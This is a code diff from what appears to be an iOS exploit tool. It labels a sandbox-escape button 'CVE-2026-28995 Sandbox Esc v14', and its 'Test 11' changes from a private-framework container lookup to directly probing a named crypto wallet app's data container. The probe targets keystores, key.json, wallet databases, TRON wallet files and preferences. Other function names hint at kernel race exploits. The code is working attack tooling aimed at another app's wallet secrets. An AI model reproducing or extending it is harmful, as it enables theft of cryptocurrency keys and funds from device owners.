@@ -663,7 +663,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v12" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v14" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7376,57 +7376,55 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
 
-    // Test 11: MCM container lookup by bundle ID
-    // Minimal approach: dlopen + lookup (v11 baseline + control test)
-    [log appendString:@"\n--- Test 11: MCMAppContainer lookup ---\n"];
-    NSString *ourBundleID = [[NSBundle mainBundle] bundleIdentifier];
-    [log appendFormat:@"  Our ID: %@\n", ourBundleID];
-    [log appendFormat:@"  Target: %@\n", @"com.global.wallet.ios"];
+    // Test 11: Read TokenPocket data container (UUID from pymobiledevice3)
+    // Data UUID: 0D926318-FE07-4B1D-8A4B-5278C4E380D5
+    // Bundle: Global Wallet.app v2.19.0
+    [log appendString:@"\n--- Test 11: TokenPocket container read ---\n"];
+    NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
+    NSString *tpBase = [NSString stringWithFormat:
+        @"var/mobile/Containers/Data/Application/%@", tpUUID];
 
-    // Flush before dlopen
-    [self appendLog:log]; [log setString:@""];
+    // Probe known wallet/keystore files
+    [log appendString:@"  Probing TokenPocket files:\n"];
 
-    void *handle = dlopen(
-        "/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager",
-        RTLD_LAZY);
-    [log appendFormat:@"  dlopen: %p\n", handle];
-
-    if (handle) {
-#pragma clang diagnostic push
-#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
-#pragma clang diagnostic ignored "-Wundeclared-selector"
-        Class cls = NSClassFromString(@"MCMAppContainer");
-        [log appendFormat:@"  MCMAppContainer: %@\n", cls ? @"found" : @"nil"];
-
-        if (cls) {
-            SEL lookupSel = NSSelectorFromString(@"containerWithIdentifier:error:");
-            if ([cls respondsToSelector:lookupSel]) {
-                // Control: lookup our own app
-                id selfContainer = [cls performSelector:lookupSel
-                    withObject:ourBundleID withObject:nil];
-                [log appendFormat:@"  self lookup: %@\n", selfContainer ?: @"nil"];
-                if (selfContainer) {
-                    id url = [selfContainer performSelector:NSSelectorFromString(@"url")];
-                    [log appendFormat:@"  self URL: %@\n", url];
-                }
-
-                // Target: TokenPocket
-                id tp = [cls performSelector:lookupSel
-                    withObject:@"com.global.wallet.ios" withObject:nil];
-                [log appendFormat:@"  TP lookup: %@\n", tp ?: @"nil"];
-                if (tp) {
-                    id url = [tp performSelector:NSSelectorFromString(@"url")];
-                    [log appendFormat:@"  TP URL: %@\n", url];
-                }
-            } else {
-                [log appendString:@"  containerWithIdentifier:error: not supported\n"];
-            }
-        }
-#pragma clang diagnostic pop
-        dlclose(handle);
-    } else {
-        [log appendString:@"  dlopen FAILED\n"];
+    // Common wallet storage locations
+    for (NSString *f in @[
+        // Root container
+        @".com.apple.mobile_container_manager.metadata.plist",
+        // Documents
+        @"Documents/",
+        // Library/Preferences
+        @"Library/Preferences/",
+        // Common wallet DB files
+        @"Documents/wallet.db",
+        @"Documents/tokenpocket.db",
+        @"Documents/tp.db",
+        @"Documents/data.db",
+        @"Documents/wallet.sqlite",
+        @"Documents/wallet.sqlite3",
+        // Library files
+        @"Library/Application Support/",
+        @"Library/Caches/",
+        // Keystore files
+        @"Documents/keystore",
+        @"Documents/key.json",
+        @"Documents/wallet.json",
+        // TRON-specific
+        @"Documents/tron",
+        @"Documents/tron_wallet",
+        @"Library/Preferences/com.global.wallet.ios.plist",
+    ]) {
+        NSString *sub = [tpBase stringByAppendingPathComponent:f];
+        probeFile(sub, log);
     }
+
+    // Read TokenPocket's Info.plist from bundle
+    NSString *tpBundleUUID = @"97028E76-0192-4651-BF43-3BFCAC8D9BA9";
+    NSString *tpInfoPath = [NSString stringWithFormat:
+        @"var/containers/Bundle/Application/%@/Global Wallet.app/Info.plist",
+        tpBundleUUID];
+    [log appendString:@"\n  TokenPocket Bundle Info.plist:\n"];
+    probeFile(tpInfoPath, log);
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
